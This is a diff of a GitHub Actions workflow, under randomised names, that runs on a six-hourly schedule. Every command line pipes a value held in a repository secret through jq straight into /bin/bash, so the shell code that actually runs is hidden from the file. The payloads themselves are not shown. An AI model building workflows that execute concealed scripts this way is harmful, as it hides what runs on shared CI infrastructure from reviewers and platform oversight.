@@ -2,37 +2,21 @@ name: lujiancheng2345
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 3/6 * * *'
+    - cron: '52 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: lujiancheng2345
         env:
-          j1782: ${{ secrets.j1782 }}
+          y37946: ${{ secrets.y37946 }}
         run: |
-          echo $j1782 | jq -r .ct29 | /bin/bash
-          echo $cgbr1122 | jq -r .v55 | /bin/bash
-          echo $dv7042 | jq -r .cxqf2040 | /bin/bash
-          echo $ne256 | jq -r .cilii87 | /bin/bash
-          echo $e965 | jq -r .f381 | /bin/bash
-          echo $ima1 | jq -r .m6 | /bin/bash
-          echo $y60395 | jq -r .swmiu2 | /bin/bash
-          echo $ctbi08 | jq -r .g4 | /bin/bash
-          echo $c91 | jq -r .mcxl949 | /bin/bash
-          echo $t71 | jq -r .kny61293 | /bin/bash
-          echo $oyp61277 | jq -r .oh202 | /bin/bash
-          echo $a22 | jq -r .ylp687 | /bin/bash
-          echo $eqo6 | jq -r .guv6 | /bin/bash
-          echo $wkr9111 | jq -r .kywcy4 | /bin/bash
-          echo $sn86597 | jq -r .inf363 | /bin/bash
-          echo $bzu60566 | jq -r .b09385 | /bin/bash
-          echo $unkv986 | jq -r .g31226 | /bin/bash
-          echo $m5 | jq -r .nv17 | /bin/bash
-          echo $sjopw89 | jq -r .el3741 | /bin/bash
-          echo $oazt52075 | jq -r .xjtx8433 | /bin/bash
-          echo $syvm2825 | jq -r .oipk275 | /bin/bash
-          echo $bbl65045 | jq -r .yw0172 | /bin/bash
+          echo $y37946 | jq -r .awta37755 | /bin/bash
+          echo $s543 | jq -r .d5191 | /bin/bash
+          echo $gx84 | jq -r .cyu749 | /bin/bash
+          echo $ghr33 | jq -r .otpy42 | /bin/bash
+          echo $ak4 | jq -r .p2511 | /bin/bash
+          echo $f9035 | jq -r .gzbpq0148 | /bin/bash
 
